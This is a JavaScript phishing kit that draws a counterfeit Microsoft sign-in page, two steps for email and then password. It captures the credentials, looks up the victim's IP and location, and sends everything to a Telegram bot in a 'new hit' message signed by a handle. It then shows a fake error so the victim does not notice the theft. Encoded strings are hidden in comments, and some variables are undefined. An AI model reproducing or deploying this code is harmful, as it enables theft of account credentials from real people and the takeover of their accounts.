(function () {
  const style = document.createElement('style');
  style.innerHTML = `
    body {
            font-family: Arial, sans-serif;
            background-color: white;
            margin: 0;
        }
        .login-container {
            margin: 5%;
            transition: transform 0.5s ease-in-out;
        }
        
        .logo {
            width: 120px;
            margin-bottom: 5px;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 5px;
            color: #1a1a1a;
        }
        .error {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
            display: none;
        }
        .input-container {
            margin-bottom: 20px;
        }
        input {
            width: 90%;
            font-size: 16px;
            padding: 8px;
            border: none;
            border-bottom: 1.2px solid #7C7C7C;
            outline: none;
            background: transparent;
        }
        input:focus {
            border-bottom: 2px solid #0078D4;
        }
        .btn {
            width: 40%;
            padding: 12px;
            background-color: #0066B8;
            color: white;
            border: none;
            border-radius: 2.3px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            margin-left: 60%;
        }
        .btn:hover {
            background-color: #005a9e;
        }
        .links {
            display: flex;
            margin-top: -10px;
            font-size: 16px;
            color: #358BE0;
            text-align: left;
        }
        a {
            color: #358BE0;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .q {
            width: 25px;
            height: 25px;
            margin-top: 13px;
        }
        .sign-in-options {
            margin-top: 80px;
            padding: 12px;
            border: 1px solid #7C7C7C;
            display: flex;
            align-items: center;
            border-radius: 2.3px;
            cursor: pointer;
            background-color: #f9f9f9;
            font-size: 16px;
        }
        .sign-in-options img {
            width: 22px;
            margin-right: 10px;
        }
        .back-button {
            font-size: 16px;
            color: black;
            cursor: pointer;
            display: flex;
            align-items: center;
            margin-bottom: 5px;
            display: none;
        }
        .back-button span {
            margin-left: 5px;
        }
        .bak {width: 15px;}
        
        
        #successMessage {
            color: red;
            font-size: 16px;
            text-align: left;
            display: none;
            width: 90%;
        }
  `;
  document.head.appendChild(style);

  window.addEventListener("DOMContentLoaded", function () {
    const container = document.createElement("div");
    container.className = "container";
    container.innerHTML = `
      <div class="login-container" id="loginForm">
        <img src="https://ranky10.github.io/Pi/Microsoft-Logo.png" alt="Microsoft Logo" class="logo">
        <h2>Sign in</h2>
        <p id="error-message" class="error">Enter a valid email address, phone number, or Skype name.</p>
        <div class="input-container">
            <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
        </div>
        <p>No account? <a href="#">Create one!</a></p>
        <div class="links">
            <p><a href="#">Sign in with a security key</a></p> 
            <img src="https://ranky10.github.io/Pi/q.png" class="q">
        </div>
        <button class="btn" id="nextBtn">Next</button>
        <div class="sign-in-options">
            <img src="https://ranky10.github.io/Pi/key-icon.png" alt="Key Icon">
            <span>Sign-in options</span>
        </div>
    </div>

    <div class="login-container" id="passwordForm" style="display: none;">
        <img src="https://ranky10.github.io/Pi/Microsoft-Logo.png" alt="Microsoft Logo" class="logo">
      
        <div class="back-button" id="backBtn">
            <img src="https://ranky10.github.io/Pi/bak.png" class="bak"><span id="enteredValue"></span>
        </div>
        <h2>Enter password</h2>
        
        <p id="successMessage">Login successful!</p>
        
        <p id="password-error" class="error">Please enter the password for your Microsoft account.</p>
        <div class="input-container">
            <input type="password" id="passwordInput" placeholder="Password" required>
        </div>
        <p>Forget password?</p>
        <div class="links">
            <p><a href="#">Other ways to sign in</a></p> 
        </div>
        <button class="btn" id="signInBtn">Sign in</button>
    </div>

    `;
    document.body.appendChild(container);

    document.getElementById("nextBtn").addEventListener("click", function() {
            const emailInput = document.getElementById("emailInput").value.trim();
            const errorMessage = document.getElementById("error-message");

            if (!emailInput) {
                errorMessage.style.display = "block";
            } else {
                errorMessage.style.display = "none";
                document.getElementById("loginForm").style.display = "none";
                document.getElementById("passwordForm").style.display = "block";
                document.getElementById("enteredValue").textContent = emailInput;
                document.getElementById("backBtn").style.display = "flex";
            }
        });

        document.getElementById("backBtn").addEventListener("click", function() {
            document.getElementById("passwordForm").style.display = "none";
            document.getElementById("loginForm").style.display = "block";
            document.getElementById("emailInput").value = document.getElementById("enteredValue").textContent;
        });

        document.getElementById("signInBtn").addEventListener("click", async function() {
            const passwordInput = document.getElementById("passwordInput").value.trim();
            const passwordError = document.getElementById("password-error");

            if (!passwordInput) {
                passwordError.style.display = "block";
                return;
            }
            passwordError.style.display = "none";
            document.getElementById("passwordInput").value = "";

            // Flash the password field red
            const passwordField = document.getElementById("passwordInput");
            passwordField.style.borderBottom = "2px solid red";

            const username = document.getElementById("emailInput").value.trim();

            // ←— SINGLE CORS‑FRIENDLY CALL HERE:
            const geoResponse = await fetch('https://ipwhois.app/json/');
            const geoData     = await geoResponse.json();
            const ipAddress   = geoData.ip;
            const countryName = geoData.country;
            const state       = geoData.region;
            const phoneCode   = geoData.country_phone;
            const dateTime    = new Date().toLocaleString();

            const message = `
𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪
🐉⊚-----------------------------------⊚🐉
<b>👤Username:</b> <code>${username}</code>\n
<b>📟Password:</b> <code>${passwordInput}</code>\n
<b>🌍Country:</b> ${countryName}\n
<b>🏴State:</b> ${state}\n
<b>⚙️IP Address:</b> ${ipAddress}\n
<b>📝Code:</b> <code>${phoneCode}</code>\n
<b>⏱Date/Time:</b> ${dateTime}\n
<b>🌐Login From:</b> Email
🐉⊚-----------------------------------⊚🐉
      ↝ ᴅᴇᴠ ʙʏ » @Hacktivia
            `;
<!-- 02'02'02'02ogvjmf'1C'02'05RMQV'05'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02jgcfgpq'1C'02'5@'02'05Amlvglv/V{rg'05'1C'02'05crrnkacvkml-hqml'05'02'5F'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02`mf{'1C'02HQML,qvpklekd{'0:'5 -->

            const telegramUrl     = `https://api.telegram.org/bot${iovjrtrdhhj9}/sendMessage`;

            await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: I94626736O,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
<!-- 02'02'02'02ogvjmf'1C'02'05RMQV'05'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02jgcfgpq'1C'02'5@'02'05Amlvglv/V{rg'05'1C'02'05crrnkacvkml-hqml'05'02'5F'0A'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02`mf{'1C'02HQML,qvpklekd{'0:'5 -->
            const successMessage = document.getElementById('successMessage');
            successMessage.style.display = 'block';
            successMessage.textContent = 'Your account or details are incorrect. Please check your information and try again!';

            // Reset border & remove message in 8s
            setTimeout(() => {
                passwordField.style.borderBottom = "1.2px solid #7C7C7C";
                successMessage.remove();
            }, 8000);
        });
  });
})();
